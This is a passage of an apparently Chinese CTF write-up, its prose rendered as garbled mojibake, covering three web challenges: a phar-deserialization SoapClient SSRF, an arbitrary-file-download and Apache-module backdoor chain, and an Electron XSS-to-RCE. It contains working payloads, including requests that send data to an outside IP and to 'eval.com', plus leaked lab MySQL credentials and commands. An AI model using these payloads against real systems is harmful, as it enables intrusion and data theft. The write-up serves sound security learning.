class="keyword">$this</span>-&gt;ip, <span class="keyword">$this</span>-&gt;port);</span><br><span class="line">    <span class="comment">//ä½¿ç”¨ä½ è‡ªå·±çš„æœåŠ¡å™¨ç›‘å¬ä¸€ä¸ªç¡®ä¿å¯ä»¥æ”¶åˆ°æ¶ˆæ¯çš„ç«¯å£æ¥è·å–flag</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œä¸”è¿˜é™åˆ¶äº†å¿…é¡»æ˜¯æœ¬åœ°æ¥è®¿é—®è¿™ä¸ª<code>admin.php</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ç›®æ ‡å¾ˆæ˜ç¡®ï¼Œå°±æ˜¯è¦ssrfçš„ç‚¹æ¥è§¦å‘è¿™ä¸ªï¼Œä»è€ŒæŠŠflagå‘ç»™æˆ‘</p><p>ä½†æ˜¯å¾ˆå°´å°¬çš„æ˜¯åœ¨<code>func.php</code>ä¸­çš„æ­£åˆ™ï¼Œè¿‡æ»¤æ‰äº†<code>phar</code>è¿™ä¸ªå…³é”®å­—ï¼Œæ‰€ä»¥åˆçœ‹ï¼Œæ„Ÿè§‰ç‚¹æ²¡æœ‰åŠæ³•è§¦å‘ï¼Œä½†æ˜¯åé¢ç»è¿‡åˆ†ææ­£åˆ™çš„è¯ï¼Œå‘ç°ä½¿ç”¨å¦‚ä¸‹æ–¹å¼å¯ä»¥bypassæ‰è¿™ä¸ªæ­£åˆ™è¿‡æ»¤ï¼Œè¿›è€Œè§¦å‘pharååºåˆ—åŒ–ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://poc.phar</span><br></pre></td></tr></table></figure><p>ä¹‹æ‰€ä»¥æƒ³åˆ°è¿™ä¸ªpharæ–‡ä»¶ï¼Œæ˜¯å› ä¸ºè¿™æ˜¯ä¸€ä¸ªä¸Šä¼ é¢˜ï¼Œè€Œä¸”å­˜åœ¨ä¸€ä¸ªç–‘ä¼¼pharååºåˆ—åŒ–çš„è§¦å‘ç‚¹â€“<code>func.php</code>ä¸­çš„è¿™å‡ è¡Œä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">$file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">$file-&gt;getMIME();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure><p>å…·ä½“æ¥è¯´å°±æ˜¯<code>getMIME()</code>å‡½æ•°ä¸­çš„<code>finfo_open</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    finfo_close($finfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç½‘ç«™å¹¶æ²¡æœ‰å…¬å¼€è¯´æ˜è¿™ä¸ªå‡½æ•°å¯ä»¥è§¦å‘pharååºåˆ—åŒ–ï¼Œæˆ‘æ˜¯æ€ä¹ˆçŸ¥é“çš„å‘¢ï¼Ÿ</p><p>zsxå¸ˆå‚…æ›¾åœ¨ä»–çš„æ–‡ç« <a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">ã€ŠPharä¸Stream Wrapperé€ æˆPHP RCEçš„æ·±å…¥æŒ–æ˜ã€‹</a>å†™åˆ°ï¼Œåªè¦å‡½æ•°åœ¨åº•å±‚è°ƒç”¨äº†è¿™ä¸ª<code>php_stream_locate_url_wrapper</code>å‡½æ•°ï¼Œé‚£ä¹ˆå°±èƒ½è§¦å‘pharååºåˆ—åŒ–ï¼Œè€Œ<code>finfo_open</code>å‡½æ•°åœ¨åº•å±‚æ°å¥½å°±æ˜¯ä½¿ç”¨äº†è¿™ä¸ªå‡½æ•°ã€‚ï¼ˆå…¶å®è¿™ä¸ªç‚¹æœ¬åœ°ç›²æ‰“ä¹Ÿèƒ½è§¦å‘ï¼Œæ‰€ä»¥å‘ç°çš„è¯ä¹Ÿä¸éš¾ï¼‰</p><p>ext/fileinfo/fileinfo.c:517<br><img src="https://i.loli.net/2019/09/05/NWG7hzBS68DRYrK.png" alt="7F3C92B8-95A2-47A7-8C89-EAEE4EB9B696.png"></p><p>åˆ°æ­¤ä¸ºæ­¢ååºåˆ—åŒ–å·²ç»å®Œæ•´äº†ï¼Œé‚£ä¹ˆæ€ä¹ˆè¿›è¡Œssrfå‘¢ï¼Ÿå¾ˆå®¹æ˜“è”æƒ³åˆ°ä¹‹å‰<code>wupco</code>å‡ºçš„easyphpä¸­çš„<code>SoapClient</code>ï¼Œæ‰€ä»¥å°±å¯ä»¥æ„é€ å¦‚ä¸‹payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;file_name = array(null, array('location' =&gt; "http://127.0.0.1/admin.php", 'uri' =&gt; "123", 'user_agent' =&gt; "heihei\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 133\r\n\r\nip=47.90.204.28&amp;port=2333&amp;admin=123&amp;clazz=ArrayIterator&amp;func1=append&amp;func2=append&amp;func3=append&amp;arg1=1&amp;arg2=1&amp;arg3=1\r\n\r\n\r\n"));</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = <span class="keyword">array</span>(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; <span class="string">"http://127.0.0.1/admin.php"</span>, <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>, <span class="string">'user_agent'</span> =&gt; <span class="string">"heihei\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 133\r\n\r\nip=47.90.204.28&amp;port=2333&amp;admin=123&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=1&amp;arg2=1&amp;arg3=1\r\n\r\n\r\n"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> File();</span><br><span class="line">$filename = <span class="string">'poc.phar'</span>;</span><br><span class="line">file_exists($filename) ? unlink($filename) : <span class="keyword">null</span>;</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åç¼€ä¸º<code>gif</code>ä¹‹åä¸Šä¼ å¾—åˆ°ä¸Šä¼ è·¯å¾„æ¥è§¦å‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://upload/8256248f8bb97051ddea1f7946057e08/2d32ae0bbeb53285459d07235d464102.gif</span><br></pre></td></tr></table></figure><p>ç›´æ¥å¾—åˆ°flag<br><img src="https://i.loli.net/2019/09/05/qJ12CDBzcX4fiK8.png" alt="AEA5041C-692A-4DB0-98F3-FE334A07A196.png"></p><h2 id="0x06-Cocktailâ€™s-Remix"><a href="#0x06-Cocktailâ€™s-Remix" class="headerlink" title="0x06 Cocktailâ€™s Remix"></a>0x06 Cocktailâ€™s Remix</h2><h4 id="é¢˜ç›®æè¿°-5"><a href="#é¢˜ç›®æè¿°-5" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p><a href="http://47.111.59.243:9016/" target="_blank" rel="noopener">http://47.111.59.243:9016/</a></p><h4 id="é¢˜ç›®è§£ç­”-5"><a href="#é¢˜ç›®è§£ç­”-5" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>è®¿é—® <a href="http://47.111.59.243:9016/" target="_blank" rel="noopener">http://47.111.59.243:9016/</a></p><p>å‘ç°å›æ˜¾çš„æ˜¯ It Works!</p><p>æ‰€ä»¥å°è¯•çˆ†ç ´è·¯å¾„</p><p>ç»“æœå‘ç° <a href="http://47.111.59.243:9016/robots.txt" target="_blank" rel="noopener">http://47.111.59.243:9016/robots.txt</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /info.php</span><br><span class="line">Disallow: /download.php</span><br><span class="line">Disallow: /config.php</span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ <a href="http://47.111.59.243:9016/download.php" target="_blank" rel="noopener">http://47.111.59.243:9016/download.php</a></p><p>å‚æ•°æ˜¯fuzzå‡ºæ¥çš„<code>filename</code>ï¼ˆå­—å…¸é“¾æ¥åŒä¸Šï¼‰</p><p><img src="https://i.loli.net/2019/09/05/i7X39aKvsDqZryg.png" alt="BA49C246-7822-4530-BEB6-8F3E7107851E.png"></p><p>ç»§ç»­ä½¿ç”¨ä¸Šè¿°å­—å…¸è¿›è¡Œfuzzï¼Œç­›é€‰å‡ºæœ‰ä»·å€¼çš„ä¿¡æ¯å¦‚ä¸‹</p><p>ä»<code>/etc/hosts</code>å‘ç°æ˜¯å­˜åœ¨å†…ç½‘çš„mysqlæœåŠ¡å™¨çš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.77.120.11   MysqlServer</span><br><span class="line">172.77.120.10   f8a7f2ca8591</span><br></pre></td></tr></table></figure></p><p>ç»§ç»­è¯»æºç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># download.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">header(<span class="string">"Content-Disposition: attachment;filename="</span>.$filename);</span><br><span class="line">header(<span class="string">'Content-Length: '</span>.filesize($filename));</span><br><span class="line">readfile($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>çœ‹åˆ°è¯»å‡ºäº†MySQLçš„è´¦å·å¯†ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$db_server = "MysqlServer";</span></span><br><span class="line"><span class="comment">//$db_username = "dba";</span></span><br><span class="line">    <span class="comment">//$db_password = "rNhHmmNkN3xu4MBYhm";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>è¿˜æœ‰ä¸€ä¸ªphpinfoé¡µé¢<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># info.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>åœ¨é¡µé¢ä¸Šæ²¡æœ‰å‘ç°å¸¸è§„æ¼æ´ï¼Œä½†æ˜¯å‘ç°äº†ä¸€ä¸ªä¸é¢˜ç›®åç§°ç±»ä¼¼çš„æ‰©å±•æ¨¡å—</p><p><img src="https://i.loli.net/2019/09/05/ApqTzZoxN7RFiPG.png" alt="26702F33-A0B9-46C5-B715-2809924CD850.png"></p><p>æ‰€ä»¥å°è¯•è¿›è¡Œä¸‹è½½ <code>/usr/lib/apache2/modules/mod_cocktail.so</code></p><p>å…ˆç”¨fileå‘½ä»¤çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯64ä½ç¨‹åºï¼Œæ‰€ä»¥ä½¿ç”¨IDA Proç›´æ¥æ¥è¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2019/09/05/JMl7xh3vN9VO8dg.png" alt="52722269-5528-4210-AAD5-B278614FD402.png"></p><p>ç›´æ¥å®šä½åˆ°å…³é”®å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­ä½¿ç”¨äº†<code>popen</code>å‡½æ•°æ¥æ‰§è¡Œç»è¿‡<code>j_remix</code>å‡½æ•°å¤„ç†çš„<code>reffer</code>å˜é‡ï¼Œæ‰€ä»¥åŸºæœ¬å¯ä»¥åˆ¤å®šæ­¤å¤„æ˜¯å­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„åé—¨ã€‚<br><img src="https://i.loli.net/2019/09/05/5aALED7ZmKgzOFW.png" alt="C4D0A50A-E002-4320-8503-2C3570E9A3DB.png"></p><p><code>j_remix</code>å‡½æ•°æ˜¯è°ƒç”¨äº†<code>remix</code>å‡½æ•°ï¼Œçœ‹èµ·æ¥æ¯”è¾ƒå¤æ‚ï¼Œä½†åº”è¯¥æ˜¯æŸç§ç¼–ç æ–¹å¼</p><p><img src="https://i.loli.net/2019/09/05/pNoUHemk8gz65IC.png" alt="2401F6EC-FAAD-4AD3-A254-B1A7B5411AC5.png"></p><p>æ­¤å¤„ä½¿ç”¨IDAçš„findcryptæ’ä»¶ï¼Œç›´æ¥å‘ç°äº†base64è¡¨ï¼Œæ‰€ä»¥çŒœæµ‹æ˜¯base64ç¼–ç </p><p><img src="https://i.loli.net/2019/09/05/c4YKaMtJT2G51Hx.png" alt="BE1138CB-7F30-4541-B3AB-8E9B5B828077.png"></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å¯ä»¥æµ‹ä¸€ä¸‹è¿™ä¸ªåé—¨ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸå›æ˜¾</p><p><img src="https://i.loli.net/2019/09/05/uanreZOVpRiPd1f.png" alt="F22B1242-EFDD-483F-AB02-18C262DF8CEF.png"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰æƒé™å†™webshell</p><p><img src="https://i.loli.net/2019/09/05/WKvYDS6LZsNoEVJ.png" alt="FF485A77-74E1-4E41-82CA-086B1F045092.png"></p><p>æ‰€ä»¥å¯èƒ½ç¨å¾®éº»çƒ¦ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¾—ç”¨ä¹‹å‰å¾—åˆ°çš„mysqlè´¦å·å¯†ç æ¥æŸ¥çœ‹æ•°æ®åº“çš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e &quot;show databases;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/05/fKdHt4SpQmzAnle.png" alt="68872B88-735E-49F6-A900-A12F57569938.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e &quot;use flag;show tables;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/05/Kr4mvRwXLbkIBeg.png" alt="A70813D1-5BD6-4CC7-A1F7-7A98FA6341B2.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e &quot;use flag;select * from flag;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/05/S7BDRxJkFsZygEf.png" alt="2A034AD6-0DFB-4FBD-A607-D299ACD5DFF1.png"></p><h2 id="0x07-iCloudMusic"><a href="#0x07-iCloudMusic" class="headerlink" title="0x07 iCloudMusic"></a>0x07 iCloudMusic</h2><h4 id="é¢˜ç›®æè¿°-6"><a href="#é¢˜ç›®æè¿°-6" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>é¢˜ç›®åšç´¯äº†å°±æ¥å¬å¬æ­Œæ”¾æ”¾æ¾å§ã€‚æ¯”å¦‚é»‘å®¢ä¸“å±æ­Œå•idï¼š 2810583532 ps: apiå¯èƒ½ä¼šè¢«ç½‘æ˜“å°ipå¯¼è‡´æ²¡åŠæ³•å¬æ­Œï¼Œä½†æ˜¯ä¸å½±å“åšé¢˜</p><p>é™„ä»¶ä¸‹è½½é“¾æ¥: <a href="https://pan.baidu.com/s/1GLfe-PP30bsIkVPvE012Hw" target="_blank" rel="noopener">https://pan.baidu.com/s/1GLfe-PP30bsIkVPvE012Hw</a> æå–ç : 37gn</p><p>codingä¸Šä¼ äº†ä¸€ä»½ï¼Œ å¤§å®¶ç½‘ä¸å¥½çš„å¯ä»¥åˆ°codingä¸Šé¢ä¸‹ <a href="https://coding.net/u/ImageMLT/p/iCloudMusic/git" target="_blank" rel="noopener">https://coding.net/u/ImageMLT/p/iCloudMusic/git</a></p><h4 id="é¢˜ç›®è§£ç­”-6"><a href="#é¢˜ç›®è§£ç­”-6" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>ä¸‹è½½ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªElectronæ¡†æ¶å†™çš„webappï¼Œå› æ­¤ç›´æ¥é‡‡ç”¨å¸¸è§„çš„Electronåº”ç”¨åˆ†ææ–¹å¼æ¥è¿›è¡Œåˆ†æï¼Œæœ¬æ–‡çš„ç¯å¢ƒæ˜¯macOSï¼Œå…¶ä½™åŒç†ã€‚</p><p>é¦–å…ˆè¿›å…¥åˆ°å¦‚ä¸‹ç›®å½•æ‰¾åˆ°asarç»“å°¾çš„æ–‡ä»¶ï¼Œæ­¤å¤„çš„åå­—æ˜¯<code>app.asar</code>ï¼Œè¿™æ˜¯ä¸€ç§ç±»ä¼¼tarçš„æ‰“åŒ…ä¹‹åçš„æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/zeroyu/Downloads/iCloudMusic-darwin-x64/iCloudMusic.app/Contents/Resources</span><br></pre></td></tr></table></figure></p><p>ä¹‹åä½¿ç”¨npmå…¨å±€å®‰è£…asarå·¥å…·ï¼Œæ¥è¿›è¡Œè§£åŒ…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar extract app.asar tmp</span><br></pre></td></tr></table></figure><p>ä¹‹åè¿›å…¥è§£åŒ…çš„ç›®å½•ï¼Œå®‰è£…ç›¸å…³ä¾èµ–åå¯åŠ¨app</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ†æä»£ç å‘ç°<code>src/index.js</code>ä¸­<code>nodeIntegration</code>æ˜¯å¼€å¯çš„ï¼Œè¯´æ˜å¯ä»¥æ³¨å…¥ä»£ç æ¥è¾¾åˆ°rceçš„ç›®çš„ã€‚</p><p>éšååˆåœ¨<code>src/main.js</code>æ–‡ä»¶ä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼Œè¿™æ®µä»£ç è¯´æ˜å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†</p><p><img src="https://i.loli.net/2019/09/05/QLyrleC4G7fSP2d.png" alt="9C84AE9D-422B-4C9F-8D5E-3C5BDEBC23E9.png"></p><p>ä¹‹åï¼Œåˆåœ¨<code>src/list.html</code>ä¸­å‘ç°ç”¨äºåˆ†äº«ç»™ç®¡ç†å‘˜çš„ä»£ç ï¼Œæ‰€ä»¥èµ·åˆå°±åˆ¤æ–­æ˜¯xss</p><p><img src="https://i.loli.net/2019/09/05/kWtoO7mvAxdwuLs.png" alt="24038218-01F0-4F92-8EB6-159EB9E88871.png"></p><p>æ‰€ä»¥åœ¨åˆ†æå¦‚ä¸‹æ¥å£çš„ä¿¡æ¯ä¹‹åæ„é€ å‡ºå¦‚ä¸‹pocæ¥å°è¯•è¯»å–ä¸€äº›ä¿¡æ¯(@5am3 tql)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;header&quot;:&quot;&apos;var t = new XMLHttpRequest;t.open(&apos;POST&apos;, &apos;//eval.com:port&apos;, !0),t.setRequestHeader(&apos;Content-type&apos;, &apos;text/plain&apos;),t.onreadystatechange = function() &#123;  4 == t.readyState &amp;&amp; t.status&#125;,t.send(&apos;test,hhhh&apos;);//&#125;;&quot;,&quot;title&quot;:&quot;xxxx&quot;,&quot;desc&quot;:&quot;xxx&quot;&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºå§‹ç»ˆæ‰“ä¸åˆ°flagç›¸å…³å­—çœ¼ï¼Œæ‰€ä»¥å°±é—®äº†å‡ºé¢˜äººï¼Œè¯´è¦rceï¼Œå¦‚å®è½¬æ¢æ€è·¯å¼€å§‹rceä¹‹æ—…</p><p>å†è¿›ä¸€æ­¥è°ƒè¯•å‰ï¼Œé¦–å…ˆå¢åŠ ä¸€äº›ä¾¿äºè°ƒè¯•çš„ä»£ç </p><ol><li>åœ¨<code>src/main.js</code>ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç </li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webview = <span class="built_in">document</span>.getElementById(<span class="string">"view"</span>);</span><br><span class="line">webview.addEventListener(<span class="string">"dom-ready"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  webview.openDevTools();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>åœ¨<code>src/index.js</code>ä¸­çš„20è¡Œå·¦å³æ·»åŠ å¦‚ä¸‹ä»£ç </li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mainWindow.openDevTools();</span><br></pre></td></tr></table></figure><p>ä¹‹åå¯åŠ¨appçš„è¯å°±ä¼šæœ‰ä¸¤ä¸ªå¼€å‘è€…è§†å›¾çª—å£ï¼Œå…¶ä¸­titleæ˜¯httpå¼€å¤´çš„æ˜¯viewçš„è°ƒè¯•çª—å£ï¼Œä¹‹åå°è¯•æ¥å¯¼å…¥æ¨¡å—æ‰§è¡Œå‘½ä»¤ï¼Œå‘ç°åœ¨æ²™ç®±ç¯å¢ƒä¸­å¤±è´¥çš„ã€‚</p><p><img src="https://i.loli.net/2019/09/05/YPG87OgLlItiKo4.png" alt="0303F269-CE22-4FFE-B389-C4B77EF978F9.png"></p><p>ä½†æ˜¯åœ¨å¦ä¸€ä¸ªè§†å›¾ä¸­æ˜¯å¯ä»¥æ‰§è¡ŒæˆåŠŸçš„</p><p><img src="https://i.loli.net/2019/09/05/msHyRIeSvQ71Vki.png" alt="5BDE4A65-83FD-4AC5-B9D7-EFBEA9C6CC71.png"></p><p>æ‰€ä»¥åº”è¯¥æ˜¯main.jsä¸­å…³äºå¯¼å…¥åŒ…çš„åŠŸèƒ½æ²¡å¼€ï¼Œæ‰€ä»¥æ— æ³•å¯¼å…¥æ¨¡å—ï¼Œæ¥è¿›è¡Œrce</p><p>PS: è¿™é‡Œçš„çš„viewæ˜¯ä¸€ä¸ªwebviewçª—å£ï¼Œç›¸å½“äºæ˜¯ä¸€ä¸ªæ²™ç›’ã€‚é»˜è®¤æ˜¯æ²¡æœ‰åŠæ³•è°ƒç”¨ç³»ç»Ÿapiçš„ã€‚</p><p>ä¹‹åæ ¹æ®hintæ¥é˜…è¯»ç›¸å…³æ–‡ç« æ—¶ï¼Œå¯ä»¥çŸ¥é“åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><blockquote><p>ç”±äºcontextisolationå…³é—­ï¼Œå¯ä»¥å¯¼è‡´webviewæ²™ç›’å†…ä¸pr.jså†…å˜é‡åœ¨åŒä¸€ä½œç”¨åŸŸï¼Œå¯ä»¥è¦†ç›–pr.jsçš„å˜é‡ã€‚è€Œä¸”pr.jsæ˜¯ä¸åœ¨æ²™ç›’è¿è¡Œé™åˆ¶å†…ã€‚æ‰€ä»¥ï¼Œåªè¦æƒ³åŠæ³•è¦†ç›–æ‰pr.jsçš„å‡½æ•°è°ƒç”¨é€»è¾‘ï¼Œå³å¯ç»•è¿‡webviewæ²™ç›’ã€‚</p></blockquote><p>æ‰€ä»¥å°±æœ‰äº†å®˜æ–¹é¢˜è§£çš„ç¬¬ä¸€ç§paylaodï¼Œæš´åŠ›è¦†å†™æ‰€æœ‰å‡½æ•°</p><p>é¦–å…ˆè¿›è¡Œåˆæ­¥è¦†å†™ï¼Œç›®çš„æ˜¯æ‰¾åˆ°ä¸€ä¸ª<code>process</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.apply2=<span class="built_in">Function</span>.prototype.apply;</span><br><span class="line"><span class="built_in">Function</span>.prototype.apply=<span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> args)</span><br><span class="line">        <span class="keyword">if</span>(args[i])</span><br><span class="line">        <span class="built_in">console</span>.log(args[i].toString());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.apply2(...args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åœ¨å¸¦æœ‰titleçš„é‚£ä¸ªdevtoolsé‡Œé¢é¦–å…ˆæ‰§è¡Œä¸Šè¿°ä»£ç ï¼Œä¹‹åæ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼Œä¾¿å¯ä»¥æ‰¾åˆ°<code>process</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.get(<span 